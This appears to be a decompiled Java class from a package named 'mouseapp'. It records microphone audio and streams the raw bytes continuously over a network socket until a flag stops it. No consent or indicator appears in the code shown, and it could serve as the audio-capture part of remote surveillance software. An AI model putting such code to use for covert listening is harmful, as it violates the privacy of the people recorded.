package mouseapp;

import java.io.*;
import javax.sound.sampled.*;

public class Mic
{
    static boolean stopped;
    private TargetDataLine line;
    
    static {
        Mic.stopped = true;
    }
    
    public Mic() {
        this.line = null;
    }
    
    public synchronized void writeAndSend() {
        try {
            Mic.stopped = false;
            final AudioFormat audioFormat = this.getAudioFormat();
            final DataLine.Info info = new DataLine.Info(TargetDataLine.class, audioFormat);
            if (!AudioSystem.isLineSupported(info)) {
                System.out.println("not supported" );
            }
            if (this.line == null) {
                try {
                    (this.line = (TargetDataLine)AudioSystem.getLine(info)).open(audioFormat);
                }
                catch (LineUnavailableException ex) {
                    System.out.println(ex);
                }
            }
            final DataOutputStream dataOutputStream = new DataOutputStream(MouseApp.s.getOutputStream());
            this.line.start();
            while (!Mic.stopped) {
                final byte[] data = new byte[this.line.getBufferSize() + 5];
                final int numBytesRead = this.line.read(data, 0, data.length);
                dataOutputStream.write(data, 0, data.length);
                dataOutputStream.flush();
                this.line.flush();
                MouseApp.s.getOutputStream().flush();
            }
            this.line.drain();
            this.line.close();
        }
        catch (Exception e) {
            System.out.println(e);
            Mic.stopped = true;
        }
        catch (Error e2) {
            e2.printStackTrace();
            Mic.stopped = true;
        }
    }
    
    private AudioFormat getAudioFormat() {
        final int sampleRate = 16000;
        final int sampleSizeBits = 16;
        final int channels = 1;
        final boolean signed = true;
        final boolean bigEndian = false;
        return new AudioFormat(sampleRate, sampleSizeBits, channels, signed, bigEndian);
    }
}